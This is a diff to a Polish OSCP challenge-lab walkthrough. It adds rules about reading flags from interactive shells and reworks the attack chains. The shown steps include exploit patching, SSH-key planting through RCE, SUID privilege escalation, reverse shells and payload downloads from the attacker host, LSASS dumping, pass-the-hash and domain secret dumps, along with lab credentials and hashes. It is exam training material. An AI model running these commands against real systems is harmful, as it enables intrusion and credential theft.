@@ -3154,6 +3154,8 @@ cat proof.txt                       # / type proof.txt
 
 > Duży łańcuch: brzegowy web (SQLi) → pivot → cała domena `medtech.com`. Pisane prosto — jedna komenda = jeden krok, z wyjaśnieniem. Wartości flag zredagowane (`<proof>`) — to publiczna strona. `<KALI>` = Twój tun0.
 > Hosty: WEB02 `192.168.224.121` (wejście, dual-homed do `172.16.224.254`), FILES02 `172.16.224.11`, DC01 `172.16.224.10`.
+>
+> 🚩 **REGUŁA OSCP — CZYTANIE FLAG:** flagę pokaż w **interaktywnym shellu** (`type`/`cat`) + screenshot z IP. **Zero punktów** za flagę z webshella lub jednorazowego `-cmd`. Tu WEB02 czytasz z reverse shella (nc), FILES02 z `evil-winrm`, DC01 z `wmiexec` — wszystko interaktywne = OK.
 
 ## C.1 Rozpoznanie
 ```bash
@@ -3283,6 +3285,8 @@ proxychains -q impacket-wmiexec -hashes :<hash_Administrator> medtech.com/Admini
 
 > 6 maszyn: 3 standalone (`.143`,`.144`,`.145`) + 3 w AD `oscp.exam` (MS01 `.141`, DC01 `10.10.224.140`, MS02 `10.10.224.142`). Assumed-breach do AD: `Eric.Wallows : EricLikesRunning800`. `<KALI>` = Twój tun0.
 > Pisane prosto, jedna komenda = jeden krok, z wyjaśnieniem. Zrobione: **.143 (root)**, **MS01 (SYSTEM)**. Reszta — patrz D.6 (uczciwy stan + jak dokończyć).
+>
+> 🚩 **REGUŁA OSCP — CZYTANIE FLAG:** `local.txt`/`proof.txt` MUSISZ pokazać w **interaktywnym shellu** komendą `type`/`cat` z oryginalnej lokalizacji + screenshot z IP celu. **Zero punktów** za flagę z webshella, przez `exploit.py --cmd`, lub `-cmd '...type...'` jednorazówką. Windows: SYSTEM/Administrator/admin shell. Linux: root shell. `evil-winrm`/`psexec`/`wmiexec`/`ssh`/reverse shell = **OK**; webshell = **NIE**.
 
 ## D.1 Rozpoznanie sieci
 ```bash
@@ -3305,20 +3309,26 @@ python3 -m venv venv && ./venv/bin/pip install aerospike     # exploit potrzebuj
 # exploit ma błędny check wersji + krótki timeout -> popraw w 49067.py:
 #   w funkcji _is_vuln() dodaj na początku:  return True
 #   w client.apply(...) dodaj policy: {'total_timeout':60000,'socket_timeout':60000}
-# uruchom (RCE jako user aero):
+# RCE jako aero (blind, io.popen zwraca output — to NIE interaktywny shell):
 ./venv/bin/python 49067.py --ahost 192.168.224.143 --aport 3000 --namespace test --cmd 'id'
-./venv/bin/python 49067.py --ahost 192.168.224.143 --aport 3000 --namespace test --cmd 'cat /home/aero/local.txt'
 ```
-PrivEsc — SUID screen:
+> ⚠️ **REGUŁA OSCP: flaga TYLKO z interaktywnego shella (`cat`), nie przez exploit `--cmd` = 0 pkt.** Egress bywa filtrowany (brak reverse shella), ale **SSH (22) jest inbound** — wgraj swój klucz przez RCE i zaloguj się interaktywnie.
 ```bash
-# przez RCE wylistuj SUID:
-#   find / -perm -4000 -type f 2>/dev/null    -> /usr/bin/screen-4.5.0  (CVE-2017-5618)
-searchsploit screen 4.5.0                                    # 41154
-# exploit wymaga kompilacji .so; brak gcc na targecie -> kompiluj na Kali i wgraj (base64)
-# uruchom łańcuch z EDB 41154 (rootbash z SUID) -> cat /root/proof.txt
+ssh-keygen -f aero_key -N ''
+KEY=$(cat aero_key.pub)
+./venv/bin/python 49067.py --ahost 192.168.224.143 --aport 3000 --namespace test --cmd "mkdir -p /home/aero/.ssh; echo $KEY > /home/aero/.ssh/authorized_keys; chmod 600 /home/aero/.ssh/authorized_keys"
+ssh -i aero_key aero@192.168.224.143            # INTERAKTYWNY shell jako aero
+#   w tym shellu:  cat /home/aero/local.txt       <-- LOCAL.TXT (interaktywny shell, cat)
+# PrivEsc — SUID screen 4.05.00 (CVE-2017-5618):
+find / -perm -4000 -type f 2>/dev/null           # -> /usr/bin/screen-4.5.0
+searchsploit screen 4.5.0                         # 41154 (libhax.so kompiluj na Kali, wgraj base64)
+# lancuch EDB 41154 tworzy SUID /tmp/rootbash:
+/tmp/rootbash -p                                  # INTERAKTYWNY root shell
+#   w root shellu:  cat /root/proof.txt           <-- PROOF.TXT (interaktywny root shell, cat)
 ```
 
 ## D.3 MS01 (.141) — Attendance and Payroll System → SYSTEM
+> ⚠️ **REGUŁA OSCP: webshell służy TYLKO do zdobycia dostępu — flag NIGDY nie czyta się z webshella (`shell.php?cmd=type` = 0 pkt).** Użyj webshella do privesc, a flagę czytaj z **interaktywnego shella** (reverse shell / evil-winrm) jako SYSTEM/admin. (MS01 to host AD — proof jest tylko na DC01, patrz D.6.)
 ```bash
 # publiczny unauth RCE (upload webshella):
 searchsploit Attendance Payroll        # 50801 (RCE) / 50802 (SQLi)
@@ -3390,6 +3400,8 @@ proxychains -q bloodhound-python -u web_svc -p Diamond1 -d oscp.exam -ns 10.10.2
 # Appendix E — OSCP Challenge Lab B (walkthrough, styl kursowy)
 
 > 6 maszyn: 3 standalone (`.149`,`.150`,`.151`) + 3 w AD `oscp.exam` (MS01 `.147`, DC01 `10.10.224.146`, MS02 `10.10.224.148`). Assumed-breach do AD: `Eric.Wallows : EricLikesRunning800`. `<KALI>`=tun0. Wynik: **.149 root, .151 SYSTEM, AD → DC01 przejęte** (5/6). `.150` — patrz E.7.
+>
+> 🚩 **REGUŁA OSCP — CZYTANIE FLAG:** `local.txt`/`proof.txt` MUSISZ pokazać w **interaktywnym shellu** komendą `type`/`cat` z oryginalnej lokalizacji + screenshot z IP celu (`ip a`/`ipconfig`). **Zero punktów** za flagę pobraną: z webshella, przez `exploit.py --cmd`, przez `nxc/wmiexec/gp.exe -cmd '...type...'` jako jednorazówkę. Windows: shell jako SYSTEM/Administrator/admin. Linux: root shell. `evil-winrm`, `psexec`, `impacket-wmiexec` (prompt), `ssh`, reverse shell = **OK** (to interaktywne shelle). Webshell = **NIE**.
 
 ## E.1 Rozpoznanie
 ```bash
@@ -3410,23 +3422,31 @@ snmpwalk -v2c -c public 192.168.224.149 1.3.6.1.4.1.8072.1.3.2   # NET-SNMP exte
 nxc ftp 192.168.224.149 -u kiero -p kiero       # [+] kiero:kiero
 # FTP jako kiero -> prywatne klucze SSH:
 ftp kiero:kiero -> get id_rsa (klucz usera john)
-ssh -i id_rsa john@192.168.224.149              # cat ~/local.txt
+ssh -i id_rsa john@192.168.224.149              # INTERAKTYWNY shell jako john
+#   w tym shellu:  cat /home/john/local.txt      <-- LOCAL.TXT (interaktywny shell, cat)
 # privesc: SUID binarka RESET_PASSWD wola 'chpasswd' bez sciezki -> PATH hijack:
 cd /tmp; printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > chpasswd
 chmod +x chpasswd; export PATH=/tmp:$PATH; /home/john/RESET_PASSWD
-/tmp/rootbash -p -c 'cat /root/proof.txt'
+/tmp/rootbash -p                                # INTERAKTYWNY root shell (NIE -c)
+#   w root shellu:  cat /root/proof.txt          <-- PROOF.TXT (interaktywny root shell, cat)
 ```
 
 ## E.3 Standalone .151 — FreeSWITCH → SYSTEM
+> ⚠️ **REGUŁA OSCP — flagi TYLKO z interaktywnego shella (`type`/`cat`), nigdy przez exploit `--cmd` ani webshell = 0 pkt.** RCE FreeSWITCH i GodPotato `-cmd` służą tylko do zdobycia dostępu; flagę czytasz dopiero z prawdziwego shella (reverse shell / evil-winrm).
 ```bash
 # port 5060 = FreeSWITCH; mod_event_socket (port 8021, haslo domyslne "ClueCon") = RCE
 searchsploit FreeSWITCH                          # 47799
-# event-socket: polacz 8021, auth ClueCon, "api system <cmd>" zwraca output (RCE jako oscp\chris)
-python3 free.py 'whoami'                          # oscp\chris
-python3 free.py 'type C:\Users\chris\Desktop\local.txt'
-# privesc: chris ma SeImpersonate -> GodPotato:
-python3 free.py 'certutil -urlcache -split -f http://<KALI>:8000/GodPotato-NET4.exe C:\Windows\Temp\gp.exe'
-python3 free.py 'C:\Windows\Temp\gp.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\proof.txt"'
+# event-socket: polacz 8021, auth ClueCon, "api system <cmd>". RCE tylko do zdobycia INTERAKTYWNEGO shella:
+# 1) listener: nc -lvnp 4151    2) odpal reverse shell przez RCE (PS -e <base64 payloadu do <KALI>:4151>):
+python3 free.py 'powershell -e <BASE64_REVERSE_SHELL>'
+# --- w interaktywnym shellu (jako oscp\chris): ---
+#   whoami ; type C:\Users\chris\Desktop\local.txt        <-- LOCAL.TXT z interaktywnego shella
+# privesc: chris ma SeImpersonate -> GodPotato daje interaktywny SYSTEM shell (nowy reverse shell):
+#   certutil -urlcache -split -f http://<KALI>:8000/GodPotato-NET4.exe C:\Windows\Temp\gp.exe
+#   certutil -urlcache -split -f http://<KALI>:8000/nc.exe C:\Windows\Temp\nc.exe   (listener: nc -lvnp 4152)
+#   C:\Windows\Temp\gp.exe -cmd "C:\Windows\Temp\nc.exe <KALI> 4152 -e cmd.exe"
+# --- w interaktywnym SYSTEM shellu: ---
+#   whoami   (nt authority\system) ; type C:\Users\Administrator\Desktop\proof.txt   <-- PROOF.TXT
 ```
 
 ## E.4 AD — foothold MS01 + local privesc (SeImpersonate)
@@ -3471,10 +3491,11 @@ faketime -f '+7h' proxychains -q impacket-mssqlclient oscp.exam/sql_svc:'Dolphin
 # Eric admin na MS02 -> wyciagnij DA z pamieci (LSASS/Mimikatz):
 proxychains -q nxc smb 10.10.224.148 -u Eric.Wallows -p 'EricLikesRunning800' -d oscp.exam -M lsassy
 #   -> OSCP\Administrator NTLM 59b280ba707d22e3ef0aa587fc29ffe5 (DA w pamieci!)
-# Pass-the-Hash na DC01 -> proof.txt + pelna domena:
+# Pass-the-Hash na DC01 -> INTERAKTYWNY shell (wmiexec/psexec/evil-winrm = OK wg reguł, to NIE webshell):
 proxychains -q impacket-wmiexec -hashes :59b280ba707d22e3ef0aa587fc29ffe5 oscp.exam/Administrator@10.10.224.146
-#   type C:\Users\Administrator\Desktop\proof.txt
-proxychains -q impacket-secretsdump -just-dc -hashes :59b280ba707d22e3ef0aa587fc29ffe5 oscp.exam/Administrator@10.10.224.146  # krbtgt itd.
+#   --- w tym interaktywnym shellu (jako oscp\administrator): ---
+#   whoami ; type C:\Users\Administrator\Desktop\proof.txt   <-- PROOF.TXT (interaktywny shell, type)
+proxychains -q impacket-secretsdump -just-dc -hashes :59b280ba707d22e3ef0aa587fc29ffe5 oscp.exam/Administrator@10.10.224.146  # krbtgt itd. (do raportu)
 ```
 
 ## E.7 .150 (Spring/Tomcat) — Text4Shell (do dokończenia)
